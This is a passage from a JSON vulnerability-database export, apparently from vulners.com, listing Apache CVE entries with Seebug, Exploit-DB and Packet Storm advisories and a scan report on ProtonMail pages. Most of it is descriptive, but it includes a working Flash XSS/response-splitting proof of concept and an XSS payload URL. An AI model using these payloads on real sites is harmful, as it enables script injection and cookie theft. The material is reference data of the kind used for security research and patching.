\nand with a modest number of requests can cause very significant memory   \nand CPU usage on the server.  \n  \n  \nAffected Apache versions (1.3.x, 2.0.x through 2.0.64, and 2.2.x through   \n2.2.19).  \n  \n  \n  \nHow to fix this vulnerability  \n-----------------------------  \nUpgrade to the latest version of Apache HTTP Server (2.2.20 or later),   \navailable from the Apache HTTP Server Project Web site.  \n  \n  \n  \n  \n  \nWeb references  \n--------------  \nCVE-2011-3192  \n  \n  \n  \n  \n  \n  \n  \n  \nSensitive page could be cached  \n******************************  \n  \n  \nVulnerability description  \n-----------------------  \n  \n  \nThis page contains possible sensitive information (e.g. a password   \nparameter)  \n  \nand could be potentially cached. Even in secure SSL channels sensitive   \ndata could  \n  \nbe stored by intermediary proxies and SSL terminators. To prevent this,   \na Cache-Control header should be specified.  \n  \nThis vulnerability affects  \n  \n  \n/sign_up.php (a18aae949b9855b60506dc83164afe7f).  \n  \n  \nGET /sign_up.php?username=urvimsoj HTTP/1.1  \n  \nPragma: no-cache  \n  \nReferer: https://protonmail.ch/lander/  \n  \n  \nResponse  \n----------  \n  \nHTTP/1.0 200 OK  \n  \nDate: Sun, 18 May 2014 19:27:10 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \nContent-Length: 8285  \n  \n  \n  \n  \nHTML form without CSRF protection  \n********************************  \n  \n  \nVulnerability description  \n------------------------------  \n  \n  \nCross-site request forgery, also known as a one-click attack or session   \nriding  \nand abbreviated as CSRF or XSRF, is a type of malicious exploit of a   \nwebsite  \nwhereby unauthorized commands are transmitted from a user that the   \nwebsite trusts.  \n  \nPenetration Tester (Authors) found a HTML form with no apparent CSRF   \nprotection implemented. Consult details for more information about the   \naffected HTML form.  \n  \n  \nAffected items  \n---------------  \n  \n/blog  \n/blog/transparency-report  \n/blog/wp-login.php  \n/blog/wp-login.php (cac6435f6386a7a635b3f12aeb81195e)  \n/crypt  \n/lander  \n/login.php  \n/report_bug.php  \n/sign_up.php  \n  \n  \n  \nThe impact of this vulnerability  \n--------------------------------  \n  \n  \nAn attacker may force the users of a web application to execute actions   \nof the attacker's choosing.  \n  \nA successful CSRF exploit can compromise end user data and operation in   \ncase of normal user.  \n  \nIf the targeted end user is the administrator account, this can   \ncompromise the entire web application.  \n  \n  \n  \n  \nHow to fix this vulnerability  \n-----------------------------  \n  \n  \nCheck if this form requires CSRF protection and implement CSRF   \ncountermeasures if necessary.  \n  \n  \n  \nCREDITS  \n-------------------------  \n  \nThis vulnerability has been discovered  \n  \nby Juan Carlos Garc\u00eda(@secnight)  \n  \nand  \n  \nFrancisco Moraga (@btshell)  \n  \n  \n  \n  \nVII. LEGAL NOTICES  \n-------------------------  \n  \nThe Authors accepts no responsibility for any damage  \ncaused by the use or misuse of this information.  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n`\n",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:126851"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ ID:\r\nCVE ID\uff1aCVE-2008-2939\r\nCNCVE ID\uff1aCNCVE-20082939\r\n\r\nIBM HTTP Server\u662f\u4e00\u6b3eHTTP\u670d\u52a1\u7a0b\u5e8f\u3002\r\nIBM HTTP Server &quot;mod_proxy_ftp&quot;\u5b58\u5728\u8f93\u5165\u9a8c\u8bc1\u95ee\u9898\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff0c\u83b7\u5f97\u654f\u611f\u4fe1\u606f\u3002\r\n\u76ee\u524d\u6ca1\u6709\u8be6\u7ec6\u89e3\u51b3\u65b9\u6848\u63d0\u4f9b\u3002\r\n\r\nIBM HTTP Server 6.0.x\r\n \u5382\u5546\u89e3\u51b3\u65b9\u6848\r\n\u53ef\u53c2\u8003\u5982\u4e0b\u5b89\u5168\u516c\u544a\u83b7\u5f97\u8865\u4e01\u4fe1\u606f\uff1a\r\n<a href=http://www-01.ibm.com/support/docview.wss?uid=swg27007033 target=_blank rel=external nofollow>http://www-01.ibm.com/support/docview.wss?uid=swg27007033</a>",
            "modified": "2009-02-16T00:00:00",
            "published": "2009-02-16T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-4786",
            "id": "SSV:4786",
            "type": "seebug",
            "title": "IBM HTTP Server mod_proxy_ftp \u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:4786"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 30560\r\nCVE(CAN) ID: CVE-2008-2939\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u3002\r\n\r\n\u5982\u679c\u5c06Apache HTTP Server\u914d\u7f6e\u4e86\u4ee3\u7406\u652f\u6301\uff08\u914d\u7f6e\u6587\u4ef6\u4e2dProxyRequests On\uff09\u4e14\u542f\u7528\u4e86mod_proxy_ftp\u6a21\u5757\u4ee5\u63d0\u4f9bHTTP\u4e0aFTP\u652f\u6301\u7684\u8bdd\uff0c\u5219\u7c7b\u4f3c\u4e8e\u4ee5\u4e0b\u7684\u5305\u542b\u6709\u901a\u914d\u7b26\u5b57\u7b26\uff08\u201c*\u201d\u3001\u201c'\u201d\u3001\u201c[\u201d\u7b49\uff09\u7684\u8bf7\u6c42\uff1a\r\n\r\n     GET ftp://host/*&lt;foo&gt; HTTP/1.0\r\n\r\n\u5c31\u4f1a\u5728mod_proxy_ftp\u6240\u8fd4\u56de\u7684\u54cd\u5e94\u4e2d\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff1a\r\n\r\n     [...]\r\n     &lt;h2&gt;Directory of &lt;a href=&quot;/&quot;&gt;ftp://host&lt;/a&gt;/*&lt;foo&gt;&lt;/h2&gt;\r\n     [...]\r\n\r\n\u5982\u679c\u8981\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0chost\u5fc5\u987b\u8fd0\u884c\u5728FTP\u670d\u52a1\u5668\u4e0a\uff0c\u8def\u5f84\u6700\u540e\u4e00\u4e2a\u76ee\u5f55\u7ec4\u4ef6\uff08XSS\u8d1f\u8f7d\uff09\u5fc5\u987b\u5305\u542b\u6709\u81f3\u5c11\u4e00\u4e2a\u901a\u914d\u7b26\u5b57\uff0c\u4e14\u4e0d\u80fd\u5305\u542b\u6709\u659c\u7ebf\u3002\r\n\n\nApache Group Apache 2.2.9 \r\nApache Group Apache 2.0.63\n Apache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\n<a href=http://svn.apache.org/viewvc?view=rev&amp;revision=682868 target=_blank>http://svn.apache.org/viewvc?view=rev&amp;revision=682868</a>",
            "modified": "2008-08-08T00:00:00",
            "published": "2008-08-08T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-3804",
            "id": "SSV:3804",
            "title": "Apache mod_proxy_ftp\u6a21\u5757\u901a\u914d\u7b26\u5b57\u7b26\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "\n                                                ftp://host/*&lt;img%20src=&quot;&quot;%20onerror=&quot;alert(42)&quot;&gt;\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:3804"
        }
    ],
    "CVE-2009-1891": [
        {
            "bulletinFamily": "exploit",
            "description": "Bugraq ID: 35623\r\nCVE ID\uff1aCVE-2009-1891\r\n\r\nApache\u662f\u4e00\u6b3e\u6d41\u884cHTTP\u670d\u52a1\u7a0b\u5e8f\u3002\r\nApache mod_deflat\u6a21\u5757\u4e0d\u6b63\u786e\u5904\u7406\u7279\u6b8a\u8bf7\u6c42\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u4f7f\u670d\u52a1\u7a0b\u5e8f\u5d29\u6e83\u3002\r\n\u5f53mod_deflate\u542f\u7528\u65f6\u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u5728\u7ed3\u675f\u4e4b\u524d\u4e2d\u6b62\u8fde\u63a5\uff0c\u4f1a\u4f7fCPU\u538b\u7f29\u6587\u4ef6\u8fbe\u5230100%\u5229\u7528\u7387\u3002\r\n\u5373\u4f7f\u4e00\u4e2a\u4e0d\u592a\u5927\u7684\u6587\u4ef6(\u51e0MB)\uff0c\u901a\u8fc7\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u63d0\u4ea4\u540c\u6b65\u8bf7\u6c42\u5e76\u9a6c\u4e0a\u4e2d\u6b62\u8fde\u63a5\uff0c\u7531\u4e8e\u8fd9\u4e2a\u6587\u4ef6\u5728\u5e73\u884c\u8fc7\u7a0b\u4e2d\u591a\u6b21\u538b\u7f29\uff0c\u53ef\u5bfc\u81f4\u6d88\u8017\u5927\u91cfCPU\u65f6\u95f4\u800c\u9020\u6210\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\n\nApache Software Foundation Apache 2.2.11\r\nApache Software Foundation Apache 2.2.10\r\nApache Software Foundation Apache 2.2.9\r\nApache Software Foundation Apache 2.2.8\r\nApache Software Foundation Apache 2.2.6\r\nApache Software Foundation Apache 2.2.5\r\nApache Software Foundation Apache 2.2.4\r\nApache Software Foundation Apache 2.2.3\r\nApache Software Foundation Apache 2.2.2\r\nApache Software Foundation Apache 2.2.7-dev\r\nApache Software Foundation Apache 2.2.6-dev\r\nApache Software Foundation Apache 2.2.5-dev\r\nApache Software Foundation Apache 2.2.1\r\nApache Software Foundation Apache 2.2\n\u7528\u6237\u53ef\u53c2\u8003\u5982\u4e0b\u94fe\u63a5\u83b7\u5f97\u8865\u4e01\u4fe1\u606f\uff1a\r\nhttp://svn.apache.org/viewvc?view=rev&amp;revision=791454",
            "modified": "2009-07-13T00:00:00",
            "published": "2009-07-13T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-11802",
            "id": "SSV:11802",
            "type": "seebug",
            "title": "Apache 'mod_deflate'\u8fdc\u7a0b\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 7.1,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:11802"
        }
    ],
    "CVE-2008-0455": [
        {
            "bulletinFamily": "exploit",
            "description": "Apache 2.2.6 'mod_negotiation' HTML Injection and HTTP Response Splitting Vulnerability. CVE-2008-0455. Remote exploit for linux platform",
            "modified": "2008-01-22T00:00:00",
            "published": "2008-01-22T00:00:00",
            "id": "EDB-ID:31052",
            "href": "https://www.exploit-db.com/exploits/31052/",
            "type": "exploitdb",
            "title": "Apache <= 2.2.6 - 'mod_negotiation' HTML Injection and HTTP Response Splitting Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/27409/info\r\n\r\nApache 'mod_negotiation' is prone to an HTML-injection and an HTTP response-splitting vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.\r\n\r\nAttacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, and influence or misrepresent how web content is served, cached, or interpreted; other attacks are also possible. \r\n\r\n// Tested on IE 7 and FF 2.0.11, Flash plugin 9.0 r115\r\n// Compile with flex compiler\r\npackage\r\n{\r\n  import flash.display.Sprite;\r\n  import flash.net.*\r\n  public class TestXss extends flash.display.Sprite {\r\n    public function TestXss(){\r\n      var r:URLRequest = new URLRequest('http://victim/<img%20src=sa%20\r\n                  onerror=eval(document.location.hash.substr(1))>#alert(123)');\r\n\r\n      r.method = 'POST';\r\n      r.data = unescape('test');\r\n      r.requestHeaders.push(new URLRequestHeader('Accept', 'image/jpeg; q=0'));\r\n\r\n      navigateToURL(r, '_self');\r\n     \r\n    }\r\n    }\r\n}\r\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:31052"
        }
    ],
    "CVE-2007-6420": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ ID: 27236\r\nCVE ID:CVE-2007-6420\r\nCVE-2007-6421\r\nCVE-2007-6422\r\nCVE-2007-6423\r\nCNCVE ID:CNCVE-20076420\r\nCNCVE-20076421\r\nCNCVE-20076422\r\nCNCVE-20076423\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u5f00\u653e\u6e90\u7801\u7684WEB\u670d\u52a1\u7a0b\u5e8f\u3002\r\nApache HTTP Server\u5305\u542b\u7684mod_proxy_balancer\u6a21\u5757\u5b58\u5728\u8f93\u5165\u9a8c\u8bc1\u95ee\u9898\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u8de8\u7ad9\u811a\u672c\uff0cCSRF\uff0c\u62d2\u7edd\u670d\u52a1\u7b49\u653b\u51fb\u3002\r\n1\uff0c\u7531\u4e8e\u6240\u6709\u884c\u4e3a\u901a\u8fc7GET\u8bbf\u95ee\u6267\u884c\uff0c\u5b58\u5728\u201cCSRF\u201d\u653b\u51fb\u3002\r\n2\uff0c&quot;mod_proxy_balancer.c&quot;\u5b58\u5728\u8de8\u7ad9\u811a\u672c\u95ee\u9898\uff0c\u8f93\u5165\u4f20\u9012\u7ed9\uff1a\r\n&quot;ss&quot; - \u4e3a&quot;&quot;StickySession Identifier&quot;,\r\n&quot;wr&quot; - \u4e3a&quot;Route&quot;,\r\n&quot;rr&quot; - \u4e3a&quot;Route Redirect&quot;\uff0c\r\n\u53c2\u6570\u6ca1\u6709\u8fdb\u884c\u4efb\u4f55\u8fc7\u6ee4\u53ef\u5bfc\u81f4\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u6267\u884c\u3002\r\n\u53e6\u5916\u5bf9&quot;balancer-mamanger&quot;\u53c2\u6570\u7f3a\u5c11\u8fc7\u6ee4\uff0c\u4e5f\u53ef\u5bfc\u81f4\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u6267\u884c\u3002\r\n3\uff0c\u7ba1\u7406\u8d1f\u8d23loadfactors\u548cmember\u72b6\u6001\u7684&quot;balancer_handler()&quot;\u5b58\u5728\u9519\u8bef\uff0c\u5f53\u7f16\u8f91\u5de5\u4f5c\u8bbe\u7f6e\u4f7f\u653b\u51fb\u8005\u8f93\u5165\u975e\u6cd5&quot;b&quot;\u53d8\u91cf\u53ef\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\r\n4\uff0c\u5f53\u5728URL\u4e2d\u8f93\u51657390 or 7506\u62167622 &quot;A&quot;\u5b57\u7b26\u65f6\u4f1a\u7531\u4e8e&quot;mod_proxy_balancer&quot;\u9519\u8bef\u800c\u5bfc\u81f4\u5185\u5b58\u7834\u574f\u3002\r\n\n\nApache Software Foundation Apache 2.2.6 \r\nApache Software Foundation Apache 2.2.5 \r\nApache Software Foundation Apache 2.2.4 \r\nApache Software Foundation Apache 2.2.3 \r\nApache Software Foundation Apache 2.2.2 \r\nApache Software Foundation Apache 2.2 .0\r\nApache Software Foundation Apache 2.2.6-dev\r\nApache Software Foundation Apache 2.2.5-dev\n \u5382\u5546\u89e3\u51b3\u65b9\u6848\r\nApache 2.2.7-dev\u5df2\u7ecf\u4fee\u6b63\u6b64\u6f0f\u6d1e\uff1a\r\n<a href=http://www.apache.org/ target=_blank>http://www.apache.org/</a>",
            "modified": "2008-01-14T00:00:00",
            "published": "2008-01-14T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-2820",
            "id": "SSV:2820",
            "title": "Apache 'mod_proxy_balancer'\u5b58\u5728\u591a\u4e2a\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:2820"
        }
    ],
    "CVE-2007-6388": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ ID: 27237\r\nCVE ID:CVE-2007-6388\r\nCNCVE ID:CNCVE-20076388\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u5f00\u653e\u6e90\u7801\u7684WEB\u670d\u52a1\u7a0b\u5e8f\u3002\r\nApache HTTP Server\u5305\u542b\u7684mod_status\u6a21\u5757\u5b58\u5728\u8f93\u5165\u9a8c\u8bc1\u95ee\u9898\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff0c\u53ef\u80fd\u83b7\u5f97\u76ee\u6807\u7528\u6237\u654f\u611f\u4fe1\u606f\u3002\r\nserver-status\u9875\u9ed8\u8ba4\u4e0d\u542f\u7528\u3002\u76ee\u524d\u6ca1\u6709\u8be6\u7ec6\u6f0f\u6d1e\u7ec6\u8282\u63d0\u4f9b\u3002\r\n\r\n\n\nPosadis Posadis 1.3.31 \r\nPosadis Posadis 1.3.28 \r\nApache Software Foundation Apache 2.2.6 \r\nApache Software Foundation Apache 2.2.5 \r\nApache Software Foundation Apache 2.2.4 \r\nApache Software Foundation Apache 2.2.3 \r\nApache Software Foundation Apache 2.2.2 \r\nApache Software Foundation Apache 2.2 .0\r\nApache Software Foundation Apache 2.0.59 \r\nApache Software Foundation Apache 2.0.58 \r\n+ Debian Linux 3.1 sparc\r\n+ Debian Linux 3.1 s/390\r\n+ Debian Linux 3.1 ppc\r\n+ Debian Linux 3.1 mipsel\r\n+ Debian Linux 3.1 mips\r\n+ Debian Linux 3.1 m68k\r\n+ Debian Linux 3.1 ia-64\r\n+ Debian Linux 3.1 ia-32\r\n+ Debian Linux 3.1 hppa\r\n+ Debian Linux 3.1 arm\r\n+ Debian Linux 3.1 amd64\r\n+ Debian Linux 3.1 alpha\r\n+ Debian Linux 3.1 \r\nApache Software Foundation Apache 2.0.56 -dev\r\nApache Software Foundation Apache 2.0.55 \r\nApache Software Foundation Apache 2.0.54 \r\n+ Debian Linux 3.1 sparc\r\n+ Debian Linux 3.1 s/390\r\n+ Debian Linux 3.1 ppc\r\n+ Debian Linux 3.1 mipsel\r\n+ Debian Linux 3.1 mips\r\n+ Debian Linux 3.1 m68k\r\n+ Debian Linux 3.1 ia-64\r\n+ Debian Linux 3.1 ia-32\r\n+ Debian Linux 3.1 hppa\r\n+ Debian Linux 3.1 arm\r\n+ Debian Linux 3.1 amd64\r\n+ Debian Linux 3.1 alpha\r\n+ Debian Linux 3.1 \r\nApache Software Foundation Apache 2.0.53 \r\nApache Software Foundation Apache 2.0.52 \r\n+ Apple Mac OS X 10.3.6 \r\n+ Apple Mac OS X 10.2.8 \r\n+ Apple Mac OS X Server 10.3.6 \r\n+ Apple Mac OS X Server 10.2.8 \r\n+ RedHat Desktop 4.0 \r\n+ RedHat Enterprise Linux WS 4\r\n+ RedHat Enterprise Linux ES 4\r\n+ RedHat Enterprise Linux AS 4\r\n+ Sun Solaris 10\r\nApache Software Foundation Apache 2.0.51 \r\n+ RedHat Fedora Core2\r\n+ RedHat Fedora Core1\r\nApache Software Foundation Apache 2.0.50 \r\n+ MandrakeSoft Linux Mandrake 10.1 x86_64\r\n+ MandrakeSoft Linux Mandrake 10.1 \r\nApache Software Foundation Apache 2.0.49 \r\n+ S.u.S.E. Linux Personal 9.1 \r\n+ Trustix Secure Linux 2.1 \r\n+ Trustix Secure Linux 2.0 \r\nApache Software Foundation Apache 2.0.48 \r\n+ MandrakeSoft Linux Mandrake 10.0 AMD64\r\n+ MandrakeSoft Linux Mandrake 10.0 \r\n+ S.u.S.E. Linux 8.1 \r\n+ S.u.S.E. Linux Personal 9.0 x86_64\r\n+ S.u.S.E. Linux Personal 9.0 \r\n+ S.u.S.E. Linux Personal 8.2 \r\n+ Trustix Secure Linux 2.1 \r\n+ Trustix Secure Linux 2.0 \r\nApache Software Foundation Apache 2.0.47 \r\n+ Apple Mac OS X Server 10.3.5 \r\n+ Apple Mac OS X Server 10.3.4 \r\n+ Apple Mac OS X Server 10.3.3 \r\n+ Apple Mac OS X Server 10.3.2 \r\n+ Apple Mac OS X Server 10.3.1 \r\n+ Apple Mac OS X Server 10.3 \r\n+ Apple Mac OS X Server 10.2.8 \r\n+ Apple Mac OS X Server 10.2.7 \r\n+ Apple Mac OS X Server 10.2.6 \r\n+ Apple Mac OS X Server 10.2.5 \r\n+ Apple Mac OS X Server 10.2.4 \r\n+ Apple Mac OS X Server 10.2.3 \r\n+ Apple Mac OS X Server 10.2.2 \r\n+ Apple Mac OS X Server 10.2.1 \r\n+ Apple Mac OS X Server 10.2 \r\n+ Apple Mac OS X Server 10.1.5 \r\n+ Apple Mac OS X Server 10.1.4 \r\n+ Apple Mac OS X Server 10.1.3 \r\n+ Apple Mac OS X Server 10.1.2 \r\n+ Apple Mac OS X Server 10.1.1 \r\n+ Apple Mac OS X Server 10.1 \r\n+ MandrakeSoft Linux Mandrake 9.2 amd64\r\n+ MandrakeSoft Linux Mandrake 9.2 \r\n+ MandrakeSoft Linux Mandrake 9.1 ppc\r\n+ MandrakeSoft Linux Mandrake 9.1 \r\nApache Software Foundation Apache 2.0.46 \r\n+ RedHat Desktop 3.0 \r\n+ RedHat Enterprise Linux WS 3\r\n+ RedHat Enterprise Linux ES 3\r\n+ RedHat Enterprise Linux AS 3\r\n+ Trustix Secure Linux 2.0 \r\nApache Software Foundation Apache 2.0.45 \r\n- Apple Mac OS X 10.2.6 \r\n- Apple Mac OS X 10.2.5 \r\n- Apple Mac OS X 10.2.4 \r\n- Apple Mac OS X 10.2.3 \r\n- Apple Mac OS X 10.2.2 \r\n- Apple Mac OS X 10.2.1 \r\n- Apple Mac OS X 10.2 \r\n- Apple Mac OS X 10.1.5 \r\n- Apple Mac OS X 10.1.4 \r\n- Apple Mac OS X 10.1.3 \r\n- Apple Mac OS X 10.1.2 \r\n- Apple Mac OS X 10.1.1 \r\n- Apple Mac OS X 10.1 \r\n- Apple Mac OS X 10.1 \r\n- Apple Mac OS X 10.0.4 \r\n- Apple Mac OS X 10.0.3 \r\n- Apple Mac OS X 10.0.2 \r\n- Apple Mac OS X 10.0.1 \r\n- Apple Mac OS X 10.0 \r\n+ Conectiva Linux 9.0 \r\nApache Software Foundation Apache 2.0.44 \r\nApache Software Foundation Apache 2.0.43 \r\nApache Software Foundation Apache 2.0.42 \r\n+ Gentoo Linux 1.4 _rc1\r\n+ Gentoo Linux 1.2 \r\nApache Software Foundation Apache 2.0.41 \r\nApache Software Foundation Apache 2.0.40 \r\n+ RedHat Linux 9.0 i386\r\n+ RedHat Linux 8.0 \r\n+ Terra Soft Solutions Yellow Dog Linux 3.0 \r\nApache Software Foundation Apache 2.0.39 \r\nApache Software Foundation Apache 2.0.38 \r\nApache Software Foundation Apache 2.0.37 \r\nApache Software Foundation Apache 2.0.36 \r\nApache Software Foundation Apache 2.0.35 \r\nApache Software Foundation Apache 1.3.39 \r\nApache Software Foundation Apache 1.3.37 \r\nApache Software Foundation Apache 1.3.36 \r\nApache Software Foundation Apache 1.3.35 -dev\r\nApache Software Foundation Apache 1.3.35 \r\nApache Software Foundation Apache 1.3.34 \r\nApache Software Foundation Apache 1.3.33 \r\n+ Apple Mac OS X 10.3.6 \r\n+ Apple Mac OS X 10.2.8 \r\n+ Apple Mac OS X Server 10.3.6 \r\n+ Apple Mac OS X Server 10.2.8 \r\n+ Debian Linux 3.1 sparc\r\n+ Debian Linux 3.1 s/390\r\n+ Debian Linux 3.1 ppc\r\n+ Debian Linux 3.1 mipsel\r\n+ Debian Linux 3.1 mips\r\n+ Debian Linux 3.1 m68k\r\n+ Debian Linux 3.1 ia-64\r\n+ Debian Linux 3.1 ia-32\r\n+ Debian Linux 3.1 hppa\r\n+ Debian Linux 3.1 arm\r\n+ Debian Linux 3.1 amd64\r\n+ Debian Linux 3.1 alpha\r\n+ Debian Linux 3.1 \r\nApache Software Foundation Apache 1.3.32 \r\n+ Gentoo Linux 1.4 \r\n+ Gentoo Linux \r\nApache Software Foundation Apache 1.3.31 \r\n+ OpenPKG OpenPKG Current\r\nApache Software Foundation Apache 1.3.29 \r\n+ Apple Mac OS X 10.3.5 \r\n+ Apple Mac OS X 10.2.7 \r\n+ Apple Mac OS X Server 10.3.5 \r\n+ Apple Mac OS X Server 10.2.7 \r\n+ MandrakeSoft Linux Mandrake 10.0 AMD64\r\n+ MandrakeSoft Linux Mandrake 10.0 \r\n+ OpenPKG OpenPKG 2.0 \r\nApache Software Foundation Apache 1.3.28 \r\n+ Conectiva Linux 8.0 \r\n+ MandrakeSoft Linux Mandrake 9.2 amd64\r\n+ MandrakeSoft Linux Mandrake 9.2 \r\n+ OpenBSD OpenBSD 3.4\r\n+ OpenPKG OpenPKG 1.3 \r\nApache Software Foundation Apache 1.3.27 \r\n+ HP HP-UX (VVOS) 11.0 4\r\n+ HP VirtualVault 4.6 \r\n+ HP VirtualVault 4.5 \r\n+ HP Webproxy 2.0 \r\n+ Immunix Immunix OS 7+\r\n+ MandrakeSoft Linux Mandrake 9.1 ppc\r\n+ MandrakeSoft Linux Mandrake 9.1 \r\n+ OpenBSD OpenBSD 3.3\r\n+ OpenPKG OpenPKG Current\r\n+ RedHat Enterprise Linux WS 2.1 IA64\r\n+ RedHat Enterprise Linux WS 2.1\r\n+ RedHat Enterprise Linux ES 2.1 IA64\r\n+ RedHat Enterprise Linux ES 2.1\r\n+ RedHat Enterprise Linux AS 2.1 IA64\r\n+ RedHat Enterprise Linux AS 2.1\r\n+ RedHat Linux Advanced Work Station 2.1 \r\n+ SGI IRIX 6.5.19 \r\nApache Software Foundation Apache 1.3.26 \r\n+ Conectiva Linux 8.0 \r\n+ Conectiva Linux 7.0 \r\n+ Conectiva Linux 6.0 \r\n+ Debian Linux 3.0 sparc\r\n+ Debian Linux 3.0 s/390\r\n+ Debian Linux 3.0 ppc\r\n+ Debian Linux 3.0 mipsel\r\n+ Debian Linux 3.0 mips\r\n+ Debian Linux 3.0 m68k\r\n+ Debian Linux 3.0 ia-64\r\n+ Debian Linux 3.0 ia-32\r\n+ Debian Linux 3.0 hppa\r\n+ Debian Linux 3.0 arm\r\n+ Debian Linux 3.0 alpha\r\n+ MandrakeSoft Corporate Server 2.1 x86_64\r\n+ MandrakeSoft Corporate Server 2.1 \r\n+ MandrakeSoft Linux Mandrake 9.0 \r\n+ OpenPKG OpenPKG 1.1 \r\n+ Trustix Secure Linux 1.5 \r\n+ Trustix Secure Linux 1.2 \r\n+ Trustix Secure Linux 1.1 \r\nApache Software Foundation Apache 1.3.25 \r\nApache Software Foundation Apache 1.3.24 \r\n+ OpenBSD OpenBSD 3.1\r\n+ Oracle Oracle HTTP Server 9.2 .0\r\n+ Oracle Oracle HTTP Server 9.0.1 \r\n+ Oracle Oracle9i Application Server 9.0.2 \r\n+ Oracle Oracle9i Application Server 1.0.2 .2\r\n+ Oracle Oracle9i Application Server 1.0.2 .1s\r\n+ Oracle Oracle9i Application Server 1.0.2 \r\n+ Slackware Linux 8.1 \r\n+ Unisphere Networks SDX-300 2.0.3 \r\nApache Software Foundation Apache 1.3.23 \r\n- IBM AIX 4.3 \r\n+ MandrakeSoft Linux Mandrake 8.2 ppc\r\n+ MandrakeSoft Linux Mandrake 8.2 \r\n+ RedHat Linux 7.3 i386\r\n+ RedHat Linux 7.3 \r\n+ S.u.S.E. Linux 8.0 i386\r\n+ S.u.S.E. Linux 8.0 \r\n+ Trustix Secure Linux 1.5 \r\n+ Trustix Secure Linux 1.2 \r\n+ Trustix Secure Linux 1.1 \r\nApache Software Foundation Apache 1.3.22 \r\n+ Caldera OpenLinux Server 3.1.1 \r\n+ Caldera OpenLinux Server 3.1 \r\n+ Caldera OpenLinux Workstation 3.1.1 \r\n+ Caldera OpenLinux Workstation 3.1 \r\n+ Conectiva Linux 8.0 \r\n+ Conectiva Linux 7.0 \r\n+ Conectiva Linux 6.0 \r\n+ MandrakeSoft Corporate Server 1.0.1 \r\n+ MandrakeSoft Linux Mandrake 8.1 ia64\r\n+ 